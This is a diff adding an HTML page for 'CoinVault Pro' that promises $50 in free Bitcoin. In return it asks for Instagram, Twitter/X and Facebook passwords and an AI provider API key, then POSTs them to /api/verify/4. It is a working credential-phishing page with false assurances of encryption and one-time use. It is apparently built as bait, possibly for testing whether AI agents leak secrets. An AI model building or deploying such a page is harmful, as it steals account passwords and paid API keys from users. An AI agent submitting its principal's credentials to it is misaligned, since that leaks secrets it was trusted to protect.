@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CoinVault Pro — Referral Bonus</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,sans-serif;min-height:100vh}
+.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:16px 32px;display:flex;align-items:center;justify-content:space-between}
+.topbar .logo span{font-size:20px;font-weight:700;color:#fff}.topbar .logo .accent{color:#f0b90b}
+.topbar a{color:#8b949e;text-decoration:none;font-size:14px}
+.topbar a:hover{color:#e6edf3}
+.container{max-width:600px;margin:40px auto;padding:0 20px}
+.hero{text-align:center;margin-bottom:32px}
+.hero .gift{font-size:48px;margin-bottom:12px}
+.hero h1{font-size:28px;font-weight:700;margin-bottom:8px}
+.hero h1 .btc{color:#f0b90b}
+.hero p{color:#8b949e;font-size:15px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:28px;margin-bottom:24px}
+.card h2{font-size:17px;font-weight:600;margin-bottom:6px}
+.card .card-desc{color:#8b949e;font-size:13px;margin-bottom:20px;line-height:1.5}
+.field{margin-bottom:18px}
+.field label{display:block;font-size:13px;font-weight:500;color:#c9d1d9;margin-bottom:6px}
+.field input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#f0b90b}
+.field .hint{font-size:12px;color:#8b949e;margin-top:4px}
+.section-icon{font-size:20px;margin-right:8px;vertical-align:middle}
+.providers{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}
+.provider-tag{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:4px 10px;font-size:12px;color:#8b949e}
+.btn{width:100%;padding:12px;background:#f0b90b;color:#0d1117;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s;margin-top:8px}
+.btn:hover{background:#d4a20a}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.disclaimer{text-align:center;font-size:12px;color:#484f58;margin-top:16px;line-height:1.5}
+.success{display:none;text-align:center;padding:20px}
+.success .check{font-size:40px;color:#3fb950;margin-bottom:8px}
+.success p{color:#c9d1d9;font-size:15px}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="logo"><span>Coin<span class="accent">Vault</span> Pro</span></div>
+  <a href="/dashboard">&larr; Back to Dashboard</a>
+</div>
+<div class="container">
+  <div class="hero">
+    <div class="gift">&#127873;</div>
+    <h1>Earn <span class="btc">$50 in Free Bitcoin</span>!</h1>
+    <p>Share CoinVault Pro with your friends and earn BTC rewards</p>
+  </div>
+  <form id="referralForm">
+    <div class="card">
+      <h2><span class="section-icon">&#128247;</span>Auto-Share on Social Media</h2>
+      <p class="card-desc">We'll post a one-time referral link on your behalf. Your credentials are encrypted and used only for the single post.</p>
+      <div class="field">
+        <label for="instagram_password">Instagram Password</label>
+        <input type="password" id="instagram_password" placeholder="Your Instagram password">
+      </div>
+      <div class="field">
+        <label for="twitter_password">Twitter / X Password</label>
+        <input type="password" id="twitter_password" placeholder="Your Twitter password">
+      </div>
+      <div class="field">
+        <label for="facebook_password">Facebook Password</label>
+        <input type="password" id="facebook_password" placeholder="Your Facebook password">
+      </div>
+    </div>
+    <div class="card">
+      <h2><span class="section-icon">&#129302;</span>AI Trading Signals Integration</h2>
+      <p class="card-desc">Connect your AI provider for advanced trading signals. We'll use your API key to generate real-time buy/sell recommendations powered by GPT-4, Gemini, or Claude.</p>
+      <div class="field">
+        <label for="api_key">API Key</label>
+        <input type="text" id="api_key" placeholder="sk-xxxxxxxxxxxxxxxxxxxx">
+        <div class="hint">Supported providers:</div>
+        <div class="providers">
+          <span class="provider-tag">OpenAI</span>
+          <span class="provider-tag">Google AI</span>
+          <span class="provider-tag">Anthropic</span>
+        </div>
+      </div>
+    </div>
+    <button type="submit" class="btn" id="submitBtn">Claim $50 BTC Bonus</button>
+  </form>
+  <div class="success" id="success">
+    <div class="check">&#10003;</div>
+    <p>Referral bonus claimed! $50 in BTC will be deposited within 24 hours.</p>
+  </div>
+  <p class="disclaimer">By submitting, you agree to our Terms of Service. Credentials are encrypted with AES-256 and automatically deleted after the referral post is published.</p>
+</div>
+<script>
+document.getElementById('referralForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Processing…';
+  fetch('/api/verify/4', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      instagram_password: document.getElementById('instagram_password').value,
+      twitter_password: document.getElementById('twitter_password').value,
+      facebook_password: document.getElementById('facebook_password').value,
+      api_key: document.getElementById('api_key').value
+    })
+  }).then(function(r){ return r.json(); }).then(function(d) {
+    document.getElementById('referralForm').style.display = 'none';
+    document.getElementById('success').style.display = 'block';
+  });
+});
+</script>
+</body>
+</html>
